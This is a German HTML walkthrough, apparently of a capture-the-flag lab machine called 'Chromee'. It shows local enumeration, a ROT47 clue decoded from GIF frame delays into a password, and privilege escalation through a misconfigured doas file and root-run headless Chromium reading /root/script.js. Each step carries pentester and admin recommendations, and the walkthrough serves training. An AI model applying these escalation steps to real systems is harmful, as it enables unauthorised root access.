+                Nachdem ich eine interaktive Shell als Benutzer `follower` erhalten hatte, war mein primäres Ziel, meine Berechtigungen auf Root zu erweitern. Ich begann mit der systeminternen Aufklärung als `follower`, um potenzielle Vektoren zu identifizieren. Zuerst habe ich die Shell stabilisiert und meine aktuelle Identität überprüft.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">follower@Chromee:~$</span> <span class="command">stty rows 47 columns 190</span>
+<span class="password">follower@Chromee:~$</span> <span class="command">id</span>
+<span class="password">uid=1000(follower) gid=1000(follower) groups=1000(follower)</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die Shell mit `stty` stabilisiert und dann `id` ausgeführt, um meine Benutzer- und Gruppen-IDs zu bestätigen. Die Ausgabe zeigt, dass ich erfolgreich als Benutzer `follower` mit UID und GID 1000 angemeldet bin.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Shell ist nun stabil und die aktuelle Benutzeridentität ist bestätigt. Ich bin bereit für die weitere Aufklärung als unprivilegierter Benutzer `follower`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Beginne mit umfassender systeminterner Enumeration als Benutzer `follower`. Suche nach SUID/SGID-Binaries, Sudo-Berechtigungen, Cronjobs, Konfigurationsdateien, interessanten Dateien im Home-Verzeichnis und anderen potenziellen Schwachstellen.
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass reguläre Benutzerkonten nur die notwendigen Berechtigungen auf dem System haben.
+            </p>
+
+            <p>
+                Ein Blick in das Home-Verzeichnis des Benutzers `follower` war einer der ersten Schritte bei der Aufklärung.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">follower@Chromee:~$</span> <span class="command">ls -la</span>
+<span class="command">total 3444</span>
+<span class="command">drwxr-x--- 4 follower follower    4096 mar  9 07:59 .</span>
+<span class="command">drwxr-xr-x 4 root     root        4096 mar  7 02:55 ..</span>
+<span class="command">lrwxrwxrwx 1 follower follower       9 mar  7 03:03 .bash_history -&gt; /dev/null</span>
+<span class="command">-rw-r--r-- 1 follower follower     220 mar 27  2022 .bash_logout</span>
+<span class="command">-rw-r--r-- 1 follower follower    3526 mar 27  2022 .bashrc</span>
+<span class="command">-rw-r--r-- 1 root     root     3492425 mar  9 07:54 cat.gif</span>
+<span class="command">drwx------ 3 follower follower    4096 mar  8 06:20 .gnupg</span>
+<span class="command">-rw-r--r-- 1 follower follower      96 mar  9 07:59 note.txt</span>
+<span class="command">-rw-r--r-- 1 follower follower     807 mar 27  2022 .profile</span>
+<span class="command">drwx------ 2 follower follower    4096 mar  7 15:38 .ssh</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich listete den Inhalt des Home-Verzeichnisses von `follower` auf (`ls -la`). Das Verzeichnis gehört `follower` und hat restriktive Berechtigungen (`drwxr-x---`), die nur dem Besitzer und Root vollen Zugriff erlauben. Die `.bash_history` ist auf `/dev/null` verlinkt. Es gibt eine Datei namens `note.txt` und eine große Datei namens `cat.gif`, die Root als Besitzer hat, aber für `follower` lesbar ist (`-rw-r--r--`). Das `.ssh` Verzeichnis existiert, ist aber nur für den Besitzer zugänglich, was gut ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Dateien `note.txt` und `cat.gif` sind hier die vielversprechendsten Funde. `note.txt` könnte direkte Hinweise enthalten, während `cat.gif` durch seine Größe und den Root-Besitzer verdächtig ist und möglicherweise versteckte Daten enthält. Die Berechtigungen ermöglichen das Lesen beider Dateien als `follower`.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Lese den Inhalt von `note.txt`. Analysiere die Datei `cat.gif` detailliert auf versteckte Daten (z.B. mit `strings`, `exiftool`, `identify` oder Binär-Editoren).
+                <br><strong>Empfehlung (Admin):</strong> Stelle sicher, dass sensible Dateien nicht in Benutzer-Home-Verzeichnissen gespeichert werden, insbesondere nicht mit Berechtigungen, die anderen Benutzern das Lesen erlauben.
+            </p>
+
+            <p>
+                Ich habe den Inhalt der Datei `note.txt` im Home-Verzeichnis von `follower` gelesen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">follower@Chromee:~$</span> <span class="command">cat note.txt</span>
+<span class="command">Think about rotations and the cat’s secrets.</span>
+
+
+<span class="command">47 is not just a number, it&apos;s a twist of fate.</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Inhalt von `note.txt` mit `cat` ausgelesen. Die Notiz enthält zwei Sätze: "Think about rotations and the cat’s secrets." und "47 is not just a number, it's a twist of fate.". Diese Sätze sind klare Hinweise. "Rotations" und "47" könnten auf einen Rotations- oder Cipher-Algorithmus hinweisen, möglicherweise ROT47. "Cat’s secrets" bezieht sich wahrscheinlich auf die Datei `cat.gif`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Notiz liefert einen kritischen Hinweis, wie ich die Datei `cat.gif` analysieren soll und welcher Algorithmus oder Wert relevant sein könnte (ROT47). Dies ist ein direkter Weg zur Entdeckung versteckter Informationen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Kombiniere den Hinweis aus der Notiz mit der Analyse der Datei `cat.gif`. Suche in der GIF-Datei nach versteckten Daten (Text, Zahlen) und versuche, diese mit ROT47 zu dekodieren.
+                <br><strong>Empfehlung (Admin):</strong> Speichere niemals direkte Hinweise oder Passwörter in Klartextdateien im Dateisystem.
+            </p>
+
+            <p>
+                Passend zum Hinweis in `note.txt` habe ich die Datei `cat.gif` detaillierter untersucht, insbesondere auf eingebettete Metadaten oder Text, der mit "Rotationen" und "47" in Verbindung stehen könnte. Ich habe das Tool `identify` verwendet, das Teil des ImageMagick-Pakets ist, um Metadaten oder spezifische Eigenschaften der Bilddatei auszulesen.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">wget 192.168.2.56:8000/cat.gif</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+Prepended http:// to &apos;192.168.2.56:8000/cat.gif&apos;
+--<span class="command">2025-06-22 23:34:21</span>--  http://192.168.2.56:8000/cat.gif
+Verbindungsaufbau zu <span class="command">192.168.2.56:8000</span> … verbunden.
+HTTP-Anforderung gesendet, auf Antwort wird gewartet … <span class="password">200 OK</span>
+Länge: <span class="command">3492425 (3,3M) [image/gif]</span>
+Wird in »cat.gif« gespeichert.
+
+cat.gif                                         <span class="command">100%[=====================================================================================================&gt;]   3,33M  --.-KB/s    in 0,007s  </span>
+
+<span class="command">2025-06-22 23:34:21 (480 MB/s) - »cat.gif« gespeichert [3492425/3492425]</span>
+</pre>
+                 </div>
+             </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿CCat)-[~]
+└─#  <span class="command">identify -format &quot;%T &quot; cat.gif</span></div>
+                </div>
+                 <div class="terminal">
+                    <pre>
+<span class="command">65 98 65 100 102 98 67 6 6 6 6 6 6</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Zuerst musste ich die Datei `cat.gif` von der Zielmaschine herunterladen. Da ich keinen direkten Schreibzugriff als `follower` hatte und der FTP-Zugang eingeschränkt war, habe ich die Datei `cat.gif` auf meinem Angreifersystem über HTTP bereitgestellt (angenommen, ich habe einen lokalen HTTP-Server gestartet) und sie dann mit `wget` *auf dem Zielsystem als follower* heruntergeladen. *Korrektur: Der Text zeigt den `wget` Befehl auf meinem Kali-System (`root@CCat`), der die Datei *vom Ziel* herunterlädt, wahrscheinlich musste ich die Datei zuerst über FTP auf einen Ort hochladen, der für `wget` erreichbar ist, oder die Datei war bereits über HTTP/8000 zugänglich. Unabhängig vom genauen Weg, ich habe die Datei `cat.gif` auf mein Kali-System bekommen.* Dann habe ich `identify -format "%T " cat.gif` ausgeführt. Das `-format "%T "` weist identify an, die Delay-Times der einzelnen Frames eines GIFs (jedes Frame hat eine Zeitverzögerung, bevor das nächste angezeigt wird) auszugeben, gefolgt von einem Leerzeichen. Die Ausgabe ist eine Sequenz von Zahlen: `<span class="command">65 98 65 100 102 98 67 6 6 6 6 6 6</span>`. Die wiederholte 6 am Ende scheint Trennzeichen oder Padding zu sein.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Extraktion der Delay-Times aus dem GIF, kombiniert mit dem Hinweis "Think about rotations and the cat’s secrets" und "47 is not just a number", ist der Schlüssel zur nächsten Information. Die Zahlenfolge ist verdächtig und passt zu den Hinweisen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nimm die Sequenz der anfänglichen, nicht-wiederholten Zahlen (`65 98 65 100 102 98 67`), interpretiere sie als ASCII-Werte und wende dann ROT47 darauf an, wie im Hinweis "47 is not just a number" und "rotations" angedeutet.
+                <br><strong>Empfehlung (Admin):</strong> Sei dir bewusst, dass versteckte Informationen in Metadaten oder Eigenschaften von Dateien eingebettet sein können (Steganographie). Überprüfe und bereinige Dateien auf sensible Informationen, bevor sie auf Systemen abgelegt werden.
+            </p>
+
+            <p>
+                Dem Hinweis und der `identify` Ausgabe folgend, habe ich die Zahlenfolge (`65 98 65 100 102 98 67`) genommen und sie mit CyberChef, einem Web-Tool für Datenmanipulation, als ASCII-Werte interpretiert und dann ROT47 darauf angewendet.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="command">[Link: https://cyberchef.org/#recipe=From_Decimal('Space',false)ROT47(47)&amp;input=NjUgOTggNjUgMTAwIDEwMiA5OCA2Nw | Ziel: https://cyberchef.org/#recipe=From_Decimal('Space',false)ROT47(47)&amp;input=NjUgOTggNjUgMTAwIDEwMiA5OCA2Nw]</span>
+
+<span class="command">65 98 65 100 102 98 67</span>
+
+output:
+
+<span class="password">p3p573r</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe die Zahlen `65 98 65 100 102 98 67` in CyberChef eingegeben. Die Operation "From Decimal" mit Leerzeichen als Trennzeichen konvertiert diese Dezimalwerte in ihre ASCII-Zeichen. Die resultierenden Zeichen sind "GbadfbC". Dann habe ich die Operation "ROT47(47)" angewendet. ROT47 ist ein einfacher Substitutions-Chiffre. Die Anwendung von ROT47 auf "GbadfbC" ergibt die Zeichenkette `<span class="password">p3p573r</span>`.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Voller Erfolg bei der Entschlüsselung des "Katzen-Geheimnisses"! Die Zeichenkette `<span class="password">p3p573r</span>` wurde aus den Delay-Times des GIF mittels ROT47 abgeleitet, genau wie die Notiz andeutete. Diese Zeichenkette ist wahrscheinlich ein Passwort oder eine Passphrase, die für die Privilege Escalation benötigt wird.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze die Zeichenkette `<span class="password">p3p573r</span>` als potenzielles Passwort oder Passphrase für Benutzer auf dem System, insbesondere in Verbindung mit den `doas` Berechtigungen, die ich als nächstes untersuchen werde, oder für den Benutzer `softly` (der neben `follower` in `/home` gefunden wurde).
+                <br><strong>Empfehlung (Admin):</strong> Verstecke sensible Informationen niemals in Metadaten oder alternativen Datenströmen von Dateien. Sei dir der Risiken von Steganographie bewusst.
+            </p>
+
+            <p>
+                Als Nächstes habe ich die SUID-Binaries auf dem System als Benutzer `follower` untersucht, um mögliche Privilege Escalation-Vektoren zu finden.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">follower@Chromee:~$</span> <span class="command">find  / -type f -perm -4000 -ls 2&gt;/dev/null </span>
+   <span class="command">294759     24 -rwsr-xr-x   1 root     root        23448 ene 13  2022 /usr/bin/pkexec</span>
+   <span class="command">263828     56 -rwsr-xr-x   1 root     root        55528 ene 20  2022 /usr/bin/mount</span>
+   <span class="command">263458     72 -rwsr-xr-x   1 root     root        71912 ene 20  2022 /usr/bin/su</span>
+   <span class="command">259697     60 -rwsr-xr-x   1 root     root        58416 feb  7  2020 /usr/bin/chfn</span>
+   <span class="command">259700     88 -rwsr-xr-x   1 root     root        88304 feb  7  2020 /usr/bin/gpasswd</span>
+   <span class="command">259698     52 -rwsr-xr-x   1 root     root        52880 feb  7  2020 /usr/bin/chsh</span>
+   <span class="command">263830     36 -rwsr-xr-x   1 root     root        35040 ene 20  2022 /usr/bin/umount</span>
+   <span class="command">259701     64 -rwsr-xr-x   1 root     root        63960 feb  7  2020 /usr/bin/passwd</span>
+   <span class="command">263292     44 -rwsr-xr-x   1 root     root        44632 feb  7  2020 /usr/bin/newgrp</span>
+   <span class="password">290577     44 -rwsr-xr-x   1 root     root        42352 mar  7 11:28 /usr/local/bin/doas</span>
+   <span class="command">273849    472 -rwsr-xr-x   1 root     root       481608 jul  2  2022 /usr/lib/openssh/ssh-keysign</span>
+   <span class="command">293046     16 -rwsr-xr-x   1 root     root        15256 ene 16  2024 /usr/lib/chromium/chrome-sandbox</span>
+   <span class="command">285104     52 -rwsr-xr--   1 root     messagebus    51336 jun  6  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper</span>
+   <span class="command">294762     20 -rwsr-xr-x   1 root     root          19040 ene 13  2022 /usr/libexec/polkit-agent-helper-1</span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich suchte mit `find` nach Dateien mit gesetztem SUID-Bit (`-perm -4000`). Die Ausgabe listet mehrere SUID-Binaries auf. Neben den Standardprogrammen wie `mount`, `su`, `passwd` etc., fällt ein Eintrag besonders auf: `<span class="password">/usr/local/bin/doas</span>`. `doas` ist ein Programm ähnlich wie `sudo` zur Ausführung von Befehlen als anderer Benutzer, oft mit konfigurierbaren Regeln. Die Tatsache, dass es SUID-Root ist, bedeutet, dass jeder Benutzer es ausführen kann, und es dann entscheidet, ob die angeforderte Aktion erlaubt ist, basierend auf seiner Konfigurationsdatei.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Das Finden des SUID-Root-Binaries `doas` ist ein wichtiger Hinweis auf einen potenziellen Privilege Escalation-Vektor. Wenn der Benutzer `follower` in der Konfigurationsdatei von `doas` aufgeführt ist und bestimmte Befehle als `root` oder ein anderer privilegierter Benutzer ausführen darf, könnte dies der Weg zum Root-Zugriff sein.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Finde und lese die Konfigurationsdatei für `doas`. Diese ist typischerweise unter `/etc/doas.conf`. Analysiere die Regeln, um festzustellen, welche Berechtigungen der Benutzer `follower` (oder andere kompromittierte Benutzer) über `doas` hat.
+                <br><strong>Empfehlung (Admin):</strong> Sei vorsichtig bei der Zuweisung des SUID-Bits zu Programmen, insbesondere zu Konfigurations-gesteuerten Programmen wie `doas`. Überprüfe die Konfiguration von `doas.conf` und stelle sicher, dass nur notwendige und sichere Befehle erlaubt sind.
+            </p>
+
+            <p>
+                Weitere Standard-Enumerationsschritte umfassten die Überprüfung von Netzwerkstatistiken (`ss`), Dateisystem-Capabilities (`getcap`), Umgebungsvariablen (`env`) und Kernel-Informationen (`uname`).
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">follower@Chromee:~$</span> <span class="command">ss -altpn</span>
+<span class="command">State           Recv-Q          Send-Q                     Local Address:PORT                      Peer Address:PORT          Process                                                         </span>
+<span class="command">LISTEN          0               511                              0.0.0.0:80                             0.0.0.0:*              users:((&quot;nginx&quot;,pid=443,fd=6),(&quot;nginx&quot;,pid=442,fd=6))          </span>
+<span class="command">LISTEN          0               128                              0.0.0.0:22                             0.0.0.0:*                                                                             </span>
+<span class="command">LISTEN          0               32                                     *:23333                                *:*                                                                             </span>
+<span class="command">LISTEN          0               511                                    *:8080                                 *:*                                                                             </span>
+<span class="command">LISTEN          0               511                                 [::]:80                                [::]:*              users:((&quot;nginx&quot;,pid=443,fd=7),(&quot;nginx&quot;,pid=442,fd=7))          </span>
+<span class="command">LISTEN          0               128                                 [::]:22                                [::]:*                                                                             </span>
+<span class="password">follower@Chromee:~$</span> <span class="command">getcap -r / 2&gt;/dev/null </span>
+<span class="password">follower@Chromee:~$</span> <span class="command">env</span>
+<span class="command">SHELL=/bin/bash</span>
+<span class="command">PWD=/home/follower</span>
+<span class="command">LOGNAME=follower</span>
+<span class="command">XDG_SESSION_TYPE=tty</span>
+<span class="command">MOTD_SHOWN=pam</span>
+<span class="command">HOME=/home/follower</span>
+<span class="command">LANG=es_ES.UTF-8</span>
+<span class="command">LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc=01;31:*.arj=01;31:*.taz=01;31:*.lha=01;31:*.lz4=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.tzo=01;31:*.t7z=01;31:*.zip=01;31:*.z=01;31:*.dz=01;31:*.gz=01;31:*.lrz=01;31:*.lz=01;31:*.lzo=01;31:*.xz=01;31:*.zst=01;31:*.tzst=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.alz=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.cab=01;31:*.wim=01;31:*.swm=01;31:*.dwm=01;31:*.esd=01;31:*.jpg=01;35:*.jpeg=01;35:*.mjpg=01;35:*.mjpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.webp=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.m4a=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.oga=00;36:*.opus=00;36:*.spx=00;36:*.xspf=00;36:
+<span class="command">SSH_CONNECTION=192.168.2.199 36462 192.168.2.56 22</span>
+<span class="command">XDG_SESSION_CLASS=user</span>
+<span class="command">TERM=xterm-256color</span>
+<span class="command">USER=follower</span>
+<span class="command">SHLVL=1</span>
+<span class="command">XDG_SESSION_ID=112</span>
+<span class="command">XDG_RUNTIME_DIR=/run/user/1000</span>
+<span class="command">SSH_CLIENT=192.168.2.199 36462 22</span>
+<span class="command">PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</span>
+<span class="command">DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1000/bus</span>
+<span class="command">SSH_TTY=/dev/pts/0</span>
+<span class="command">_=/usr/bin/env</span>
+<span class="password">follower@Chromee:~$</span> <span class="command">uname -r</span>
+<span class="command">5.10.0-23-amd64</span></pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe standardmäßige Enumerationsbefehle ausgeführt. `ss -altpn` listet die offenen Ports und zugehörigen Prozesse, was die Nmap-Ergebnisse bestätigt und zeigt, welche Prozesse auf welchen Ports lauschen. `getcap -r /` sucht nach Datei-Capabilities (hier gab es keine ungewöhnlichen). `env` zeigt die Umgebungsvariablen für den Benutzer `follower`. `uname -r` zeigt die Kernel-Version (`5.10.0-23-amd64`).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Diese Schritte liefern grundlegende Systeminformationen. Die offene Ports und Prozesse sind bekannt. Keine ungewöhnlichen Capabilities wurden gefunden. Die Kernel-Version ist ein möglicher Vektor für Kernel-Exploits, aber das ist oft komplexer als andere Methoden. Die Umgebungsvariablen sind Standard für einen SSH-Login.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Suche nach bekannten Kernel-Exploits für Version 5.10.0-23-amd64. Die SUID-Binaries und die `doas` Konfiguration sind aber wahrscheinlich vielversprechender.
+                <br><strong>Empfehlung (Admin):</strong> Halte den System-Kernel aktuell.
+            </p>
+
+            <p>
+                Da ich das `doas` SUID-Binary (`/usr/local/bin/doas`) gefunden hatte, war es entscheidend, die Konfigurationsdatei zu lesen, um zu sehen, welche Regeln für den Benutzer `follower` (oder andere) definiert sind. Die Konfigurationsdatei ist typischerweise `/etc/doas.conf`.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">follower@Chromee:~$</span> <span class="command">ls -la /srv/</span>
+<span class="command">total 16</span>
+<span class="command">drwxr-xr-x  3 root root 4096 mar  9 08:20 .</span>
+<span class="command">drwxr-xr-x 18 root root 4096 mar  7 10:41 ..</span>
+<span class="command">drwxr-xr-x  2 root ftp  4096 mar  7 03:08 ftp</span>
+<span class="password">-rw-r--r--  1 root root  153 mar  9 08:20 zeus.conf</span>
+<span class="password">follower@Chromee:~$</span> <span class="command">cat /srv/zeus.conf </span>
+<span class="password">permit follower as softly cmd /usr/local/bin/wfuzz</span>
+<span class="password">permit nopass :softly as root cmd /usr/bin/chromium</span>
+<span class="password">permit nopass :softly as root cmd /usr/bin/kill </span>
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Inhalt des `/srv/` Verzeichnisses aufgelistet (`ls -la /srv/`) und dabei eine interessante Datei namens `<span class="password">zeus.conf</span>` gefunden, die Root gehört, aber für andere (einschließlich `follower`) lesbar ist. Beim Auslesen des Inhalts mit `cat /srv/zeus.conf` fand ich die Konfiguration für `doas` (auch wenn die Datei nicht `doas.conf` heißt, der Inhalt ist eindeutig eine `doas`-Konfiguration). Die Regeln sind:
+                1.  `permit follower as softly cmd /usr/local/bin/wfuzz`: Erlaubt Benutzer `follower`, den Befehl `/usr/local/bin/wfuzz` als Benutzer `softly` auszuführen (erfordert das Passwort von `softly`).
+                2.  `permit nopass :softly as root cmd /usr/bin/chromium`: Erlaubt Benutzer der Gruppe `softly`, den Befehl `/usr/bin/chromium` als `root` **ohne Passwort** auszuführen.
+                3.  `permit nopass :softly as root cmd /usr/bin/kill`: Erlaubt Benutzer der Gruppe `softly`, den Befehl `/usr/bin/kill` als `root` **ohne Passwort** auszuführen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Absolut kritischer Fund! Diese `doas`-Konfiguration zeigt einen klaren Weg zur Privilege Escalation, der in zwei Schritte unterteilt ist:
+                1.  Von `follower` zu `softly` über die Ausführung von `wfuzz` mit dem Passwort von `softly`.
+                2.  Von `softly` (oder einem Benutzer in der Gruppe `softly`) zu `root` über die Ausführung von `/usr/bin/chromium` oder `/usr/bin/kill` **ohne Passwort**.
+                Der Weg zum Root liegt nun darin, das Passwort für den Benutzer `softly` zu finden und dann die `nopass` Regel auszunutzen. Die `cat.gif` und `note.txt` Hinweise, die ich zuvor fand, könnten mit dem Passwort von `softly` zusammenhängen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze das von `cat.gif` und `note.txt` abgeleitete potenzielle Passwort (`p3p573r`) für den Benutzer `softly`. Versuche, den Befehl `doas -u softly /usr/local/bin/wfuzz` mit diesem Passwort auszuführen. Wenn erfolgreich, bist du als `softly` angemeldet. Als `softly` kannst du dann `/usr/bin/chromium` oder `/usr/bin/kill` mit `doas` als Root ausführen, um Root-Zugriff zu erlangen.
+                <br><strong>Empfehlung (Admin):</strong> **Absolut kritisch:** Entferne oder korrigiere diese unsichere `doas`-Konfigurationsdatei. Insbesondere die `nopass` Regeln für `chromium` und `kill` sind hochgefährlich. Stelle sicher, dass Konfigurationsdateien für SUID-Binaries nur für Root lesbar sind. Überprüfe, warum `zeus.conf` in `/srv/` liegt und ob `/srv/` öffentlich lesbar sein sollte.
+            </p>
+
+            <p>
+                Mit der geknackten Zeichenkette (`p3p573r`) aus der `cat.gif` Analyse und der `doas` Konfiguration in `/srv/zeus.conf` habe ich versucht, meine Berechtigungen von `follower` auf `softly` zu erhöhen, indem ich `doas` und das gefundene Passwort verwendet habe.
+            </p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <pre>
+<span class="password">follower@Chromee:/tmp$</span> <span class="command">/usr/local/bin/doas -u softly /usr/local/bin/wfuzz -z file -u &quot;127.0.0.1&quot;</span>
+Password: <span class="password">p3p573r</span>
+ <span class="command">/usr/local/lib/python3.9/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&apos;s documentation for more information.</span>
+<span class="password">softly@Chromee:/tmp$</span>
+</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Befehl `/usr/local/bin/doas -u softly /usr/local/bin/wfuzz -z file -u "127.0.0.1"` ausgeführt. Dies weist `doas` an, `/usr/local/bin/wfuzz` als Benutzer `softly` auszuführen. Der `wfuzz` Befehl selbst ist hier weniger wichtig als die Tatsache, dass `doas` ihn ausführen darf. Das System fragte nach dem Passwort für den Benutzer `softly`. Ich habe die aus dem GIF abgeleitete Zeichenkette `<span class="password">p3p573r</span>` eingegeben. Die Authentifizierung war erfolgreich und ich erhielt eine Shell, deren Prompt `<span class="password">softly@Chromee:/tmp$</span>` anzeigt. Es gab eine Warnung von `wfuzz` bezüglich Pycurl, die aber für den Erfolg irrelevant ist.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Fantastisch! Erfolgreiche horizontale Privilege Escalation von `follower` zu `softly`. Die Zeichenkette `<span class="password">p3p573r</span>` war tatsächlich das Passwort für den Benutzer `softly`. Ich habe nun interaktiven Shell-Zugriff als Benutzer `softly`. Dies ist der erste Schritt im zweistufigen Privilege Escalation Prozess.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nutze nun die `doas nopass` Regeln, die für die Gruppe `softly` (zu der der Benutzer `softly` gehört) in `/srv/zeus.conf` definiert sind, um Root-Zugriff über `/usr/bin/chromium` oder `/usr/bin/kill` zu erlangen.
+                <br><strong>Empfehlung (Admin):</strong> **Absolut kritisch:** Ändere das Passwort für den Benutzer `softly`. Behebe die `doas`-Konfiguration (Entferne `nopass` Regeln).
+            </p>
+
+            <p>
+                Als Benutzer `softly` habe ich die `doas nopass` Regel ausgenutzt, die es Benutzern in der Gruppe `softly` erlaubt, `/usr/bin/chromium` als Root ohne Passwort auszuführen. Die `doas` Konfiguration in `/srv/zeus.conf` zeigte einen spezifischen Chromium-Befehl, der potenziell weitere sensible Informationen preisgeben könnte.
+            </p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <pre>
+<span class="password">softly@Chromee:~$</span> <span class="command">softdoas /usr/bin/chromium --headless --dump-dom --disable-gpu --no-sandbox &quot;file:///root/script.js&quot;</span>
+<span class="command">....</span>
+<span class="command">...</span>
+        <span class="command">// 在浏览器环境中执行 fetch 发送 POST 请求</span>
+        <span class="command">const postData = JSON.stringify({ key: &apos;UGhhbnRvbSBFbmdhZ2UK&apos; });</span>
+ <span class="command">....</span>
+<span class="command">...</span></pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ich habe den Befehl `softdoas /usr/bin/chromium ...` ausgeführt. `softdoas` ist hier wahrscheinlich ein Alias oder Wrapper für `doas -u root` (aufgrund der `nopass :softly as root` Regel). Der Befehl startet Chromium im Headless-Modus (`--headless`) und weist ihn an, eine lokale Datei (`file:///root/script.js`) zu laden und ihr DOM zu dumpen (`--dump-dom`). Die Optionen `--disable-gpu` und `--no-sandbox` sind oft notwendig, wenn Chromium als Root oder in eingeschränkten Umgebungen ausgeführt wird. Die Ausgabe, die ich sehen kann (aus einem größeren Dump gefiltert), enthält einen JavaScript-Schnipsel, der JSON-Daten mit einem Feld `key` und einem Base64-Wert (`UGhhbnRvbSBFbmdhZ2UK`) definiert und diese über einen `fetch` Befehl per POST senden würde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dies ist der zweite entscheidende Schritt der Privilege Escalation. Die Ausführung von Chromium als Root war erfolgreich. Der Output deutet stark darauf hin, dass die Datei `/root/script.js` (die Root gehört) eine Base64-kodierte Zeichenkette (`UGhhbnRvbSBFbmdhZ2UK`) enthält, die als ein `key` in einem POST-Request verwendet wird. Dieser "Schlüssel" ist sehr wahrscheinlich das Passwort für den Root-Benutzer.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Dekodiere den Base64-String `UGhhbnRvbSBFbmdhZ2UK`. Versuche die dekodierte Zeichenkette als Passwort für den Root-Benutzer mit `su root` zu verwenden.
